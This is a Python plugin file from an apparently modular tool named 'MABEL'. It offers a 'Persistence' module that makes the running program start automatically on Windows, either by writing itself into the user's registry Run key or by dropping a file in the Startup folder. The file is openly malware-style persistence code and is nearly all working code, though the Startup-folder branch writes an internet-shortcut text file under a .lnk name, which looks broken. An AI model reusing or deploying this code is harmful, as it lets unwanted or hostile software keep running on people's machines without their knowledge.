from core.plugin_base import PluginBase
import os

class PersistencePlugin(PluginBase):
    @property
    def name(self): return "Persistence"
    @property
    def description(self): return "Adds this tool to Windows startup for persistence."

    def run(self, method="registry", **kwargs):
        try:
            exe = os.path.abspath(os.sys.argv[0])
            if method == "registry":
                import winreg
                key = winreg.HKEY_CURRENT_USER
                regpath = r"Software\Microsoft\Windows\CurrentVersion\Run"
                with winreg.OpenKey(key, regpath, 0, winreg.KEY_ALL_ACCESS) as regkey:
                    winreg.SetValueEx(regkey, "MABEL", 0, winreg.REG_SZ, exe)
                return "Persistence added to registry Run key."
            elif method == "startup":
                startup_folder = os.path.join(os.environ["APPDATA"], "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
                shortcut = os.path.join(startup_folder, "MABEL.lnk")
                with open(shortcut, "w") as f:
                    f.write(f"[InternetShortcut]\nURL=file:///{exe}\n")
                return "Persistence added to Startup folder."
            else:
                return f"Unknown persistence method: {method}"
        except Exception as e:
            return f"Persistence setup failed: {e}"

def get_plugin():
    return PersistencePlugin()
